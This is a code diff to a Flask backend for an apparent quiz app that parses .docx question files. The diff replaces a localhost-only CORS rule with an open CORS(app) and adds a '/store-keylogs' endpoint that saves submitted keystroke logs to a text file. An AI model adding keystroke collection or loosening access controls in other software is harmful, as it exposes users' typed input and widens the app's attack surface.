@@ -9,7 +9,7 @@ from werkzeug.utils import secure_filename
 import docx
 
 app = Flask(__name__)
-CORS(app, resources={r"/*": {"origins": "http://localhost:3000"}})
+CORS(app)
 
 # Ensure directories exist
 UPLOAD_FOLDER = 'uploaded_files'
@@ -95,6 +95,25 @@ def upload_file():
         return jsonify({"success": True, "questions": questions}), 200
     except Exception as e:
         return jsonify({"success": False, "message": f"Error processing file: {str(e)}"}), 500
+
+@app.route('/store-keylogs', methods=['POST'])
+def store_keylogs():
+    """Handles storing keylogs to a text file."""
+    data = request.get_json()
+    key_logs = data.get('keyLogs', '')
+
+    if not key_logs:
+        return jsonify({"success": False, "message": "No key logs provided"}), 400
+
+    try:
+        file_path = os.path.join(UPLOAD_FOLDER, 'keylogs.txt')
+        with open(file_path, 'w', encoding='utf-8') as file:
+            file.write(key_logs)
+
+        return jsonify({"success": True, "message": "Keylogs stored successfully"}), 200
+    except Exception as e:
+        return jsonify({"success": False, "message": f"Error storing keylogs: {str(e)}"}), 500
+
 
 def parse_questions(filepath, filename):
     questions = []
